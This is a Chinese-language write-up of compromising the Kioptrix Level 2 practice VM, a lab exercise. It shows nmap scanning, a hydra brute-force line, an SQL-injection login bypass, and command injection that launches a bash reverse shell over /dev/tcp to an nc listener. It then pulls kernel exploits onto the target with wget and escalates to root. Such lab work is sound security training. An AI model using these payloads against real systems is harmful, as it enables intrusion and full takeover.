打开虚拟机，和攻击机在同一个网段

### 信息收集
#### IP发现
`arp-scan 192.168.159.0/24`和`nmap -sn 192.168.159.0/24`扫描，得到192.168.159.130的目标IP

#### 服务探测
`nmap -sT -sV -Pn -p 1-65535 192.168.159.130`

得到

```
host             port  proto  name       state  info
----             ----  -----  ----       -----  ----
192.168.159.130  22    tcp    ssh        open   OpenSSH 3.9p1 protocol 1.99
192.168.159.130  80    tcp    http       open   Apache httpd 2.0.52 (CentOS)
192.168.159.130  111   tcp    rpcbind    open   2 RPC #100000
192.168.159.130  443   tcp    ssl/https  open   
192.168.159.130  631   tcp    ipp        open   CUPS 1.1
192.168.159.130  950   tcp    status     open   1 RPC #100024
192.168.159.130  3306  tcp    mysql      open   Error: \x04Host '192.168.159.128' is not allowed to connect to this MySQL server
```

#### MySQL version发现
不能连接，无法通过nmap发现端口，暂不用sqlmap判断

#### web发现
直接访问发现有表单，web可以测试

### 漏洞分析
```
searchsploit openssh 3.9
searchsploit httpd 2.0
searchsploit rpc
searchsploit cups 1.1
searchsploit mysql
hydra -l name -p pass 192.168.159.130 mysql
```

排除没有PoC的不容易利用的漏洞后，有一些可能可以利用的点

apache httpd目录遍历和XSS和其他Web漏洞

看来要用Web作为切入点

### 漏洞利用
直接进入，发现可以sql注入，使用`aaa' OR 1=1 -- `登录，发现ping功能的接口，白送一个命令注入，输入命令会弹出新页面太麻烦，使用反弹shell:`127.0.0.1; bash -i >& /dev/tcp/192.168.159.128/445 0>&1`，之前kali机器上打开nc监听`nc -lvnp 445`，获得目标服务器shell

```
$ whoami
apache
$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
$ cat /etc/*-release
CentOS release 4.5 (Final)
$ mysql -V
mysql  Ver 14.7 Distrib 4.1.22, for redhat-linux-gnu (i686) using readline 4.3
```

### 后渗透攻击
已知机器版本有CentOS4.5，Linux2.6.9，MySQL版本为4.1.22

```
searchsploit linux centos 4.5
searchsploit mysql 4.1
```

发现一些

```
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpa | exploits/linux/local/9545.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 | exploits/linux/local/9479.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                      | exploits/linux/local/1518.c
```

将这些文件拷贝到目标机器上，攻击机器上执行一下操作
```
$ cp /usr/share/exploitdb/exploits/linux/local/9545.c .
$ cp /usr/share/exploitdb/exploits/linux/local/9479.c .
$ cp /usr/share/exploitdb/exploits/linux/local/1518.c .
$ python3 -m http.server 9999
```

用拿到到shell执行以下操作
```
$ cd /tmp  # 原有路径下没有写权限
$ wget http://192.168.159.128:9999/9545.c
$ wget http://192.168.159.128:9999/9479.c
$ wget http://192.168.159.128:9999/1518.c
$ gcc -o aaa 9545.c
9545.c:376:28: warning: no newline at end of file
$ gcc -o bbb 9479.c
9479.c:130:28: warning: no newline at end of file
$ gcc -o ccc 1518.c
1518.c:93:28: warning: no newline at end of file
/usr/lib/gcc/i386-redhat-linux/3.4.6/../../../crt1.o(.text+0x18): In function `_start':
: undefined reference to `main'
collect2: ld returned 1 exit status
$ ./aaa
sh: no job control in this shell
sh-3.00# whoami
root
```

使用9545.c提权成功，其他都失败


### 其他
使用sqlmap注入可以，但读写文件失败，可能sql执行一些权限的内容不熟
